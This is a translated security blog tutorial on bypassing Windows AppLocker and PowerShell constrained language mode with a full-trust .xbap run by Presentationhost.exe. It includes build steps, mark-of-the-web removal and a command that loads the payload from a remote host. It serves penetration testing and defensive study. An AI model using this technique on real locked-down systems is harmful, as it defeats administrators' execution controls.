**Presentationhost.exe是一个内置的Windows可执行文件，用于运行[XAML浏览器应用程序](https://en.wikipedia.org/wiki/XAML_Browser_Applications)（即.xbap文件）。在多个AppLocker白名单绕过列表中，Presentationhost.exe都位列其中（例如[api0cradl](https://github.com/api0cradle/UltimateAppLockerByPassList)和[milkdevil](https://github.com/milkdevil/UltimateAppLockerByPassList)），但在网上有关如何使用它的资料却少之又少。因此，我决定将自己的研究成果分享出来，以供大家学习和参考。**

当我们打开.xbap文件，它似乎是在IE中启动的应用程序，但代码实际上是在另一个进程（Presentationhost.exe）中运行，通常是在一个沙箱中以保护用户免受恶意代码的攻击。如果你熟悉[Java
Web
Start文件](https://en.wikipedia.org/wiki/Java_Web_Start)（.jnlp），则xpabs的行为与其类似，只是这里IE启动的是Presentationhost.exe而不是Java.exe，编写的代码是c#而不是Java。

注意，xbap可以请求不同的权限级别。为了执行潜在的恶意操作，应用程序必须请求从文件位置（即本地文件系统或网络共享）打开XBAP时可以执行的非限制性权限。如果应用程序请求权限过多，则尝试通过HTTP或FTP打开xbap将失败。有关安全模型的更多信息请[参阅此处](https://docs.microsoft.com/en-us/dotnet/framework/wpf/security-wpf)。

创建XBAP应用程序你可以克隆[我的PoC](https://github.com/jpginc/xbapAppWhitelistBypassPOC)，或按照以下说明来构建你自己的POC：

1.下载 [visual studio 2010](https://visualstudio.microsoft.com/vs/older-downloads/) professional service pack 1 trial。

2.打开 visual studio 并选择“New, Project”。

3.在 new project 界面，搜索“WPF Browser Application”并创建一个新的 Visual C# app。

![1_W_x8S0idcLekFbuPwztRGw.png](https://image.3001.net/images/20181107/1541554660_5be241e4a6267.png!small)

初始化新项目后，你将看到如下界面：

![2_sJPt3wVWsb0cO2HxdI8kdQ.png](https://image.3001.net/images/20181107/1541554674_5be241f2628ef.png!small)

如果你点击运行，你的默认浏览器将会打开.xbap文件。如果你的默认浏览器不是IE，那么你需要将file:///
URL从默认浏览器的地址栏复制到IE上打开。如果一切正常，你应该会收到如下警告消息：

![3_jq9Iw1dmqoPqLVSUXT6gpg.png](https://image.3001.net/images/20181107/1541554690_5be24202aa66f.png!small)

点击运行后，将出现一个空白页面。让我们来创建一个简单的UI，即在左侧输入命令右侧输出结果。此外，我还将添加一个带有单击事件的按钮。

如果此时你尝试运行该应用程序，将会收到“Button_Click”未定义的错误提示。我们打开Page1.xaml.cs定义按钮单击方法。这里我将使用C#的Pipeline类来运行PowerShell命令（有趣的是，以这种方式运行PowerShell命令可以绕过约束语言模式）。以下代码将在[Pipeline](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline?view=powershellsdk-1.1.0)中运行一些PowerShell命令，并将输出写入到屏幕。

编译应用程序，你需要通过右键单击“Solution Explorer”中的“References”文件夹，并选择“Add
Reference”来引用System.Management.Automation dll。 然后浏览到：

    
    
    C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll

![4_Wmm6bF1mlsaKgxVuPzVwkw.png](https://image.3001.net/images/20181107/1541554711_5be2421706a29.png!small)

添加引用后，你应该能够编译该项目（如果未将项目命名为“powershell”，则可能需要更改命名空间）。现在如果你运行xbap它应该会成功打开，但当你尝试运行命令时会出现以下错误：

![5_ITvJIwu6b3v5oa7EFLxJdQ.png](https://image.3001.net/images/20181107/1541554726_5be242267efa0.png!small)

此错误是Presentationhost的沙箱在告诉你，应用程序试图在它的权限级别之上执行某些操作，有关xbap安全性的更多介绍请参阅[此处](https://docs.microsoft.com/en-us/dotnet/framework/wpf/security-wpf)。要使xbap请求具有完全信任权限（即对操作系统的非沙盒访问），请到Project
-> Properties -> Security下选择“This is a full trust application”进行设置。

![6_kxKgbGZpgitMnvsxtbRF1Q.png](https://image.3001.net/images/20181107/1541554743_5be2423797abc.png!small)

运行应用程序，PowerShell命令现在应该能够正常执行。

![7_EfdD3Gt_ngvaRRkhFPWb7A.png](https://image.3001.net/images/20181107/1541554762_5be2424a936fa.png!small)

编译的应用程序可以在visual studio项目的\bin\Debug文件夹中找到。

    
    
    powershell.exe
    
    powershell.exe.manifest
    
    powershell.pdb
    
    powershell.xbap

要绕过默认的AppLocker规则，请将这些文件复制到锁定的计算机，然后双击.xbap文件。如果你从网站下载该文件，它将无法运行，因为它将包含[Web标记](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/ms537628%28v=vs.85%29)。你可以通过右键单击该文件，然后单击“Unblock（取消阻止）”复选框来删除Web标记（或者你也可以使用
[PowerShell](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/unblock-file?view=powershell-6)）。

![8_UbfAkWWsw1ZXfQdyIptkWA.png](https://image.3001.net/images/20181107/1541554781_5be2425d57278.png!small)

如果你不想将文件复制到锁定的计算机上，你也可以从命令行使用file:/// URI 或 UNC路径来运行presentation host，例如：

    
    
    presentationhost.exe file:///ipAddressOrHostName/powershell.xbap

以下是PowerShell xbap的源码：

<https://github.com/jpginc/xbapAppWhitelistBypassPOC/tree/master>

我将已编译的文件包含在了repo中，以便你在锁定环境中运行PowerShell，你可以[在此处获取文件](https://github.com/jpginc/xbapAppWhitelistBypassPOC/tree/master/powershell/bin/Debug)。

好了，以上就是我的分享。希望能为你的实际测试工作带来帮助和新的灵感。另外，也欢迎大家关注我的[twitter](https://twitter.com/JPG1nc)，我会不定期的在上面分享我的研究成果。感谢阅读！

 ***参考来源：[medium](https://medium.com/tsscyber/applocker-bypass-presentationhost-exe-8c87b2354cd4)，FB小编secist编译，转载请注明来自FreeBuf.COM**

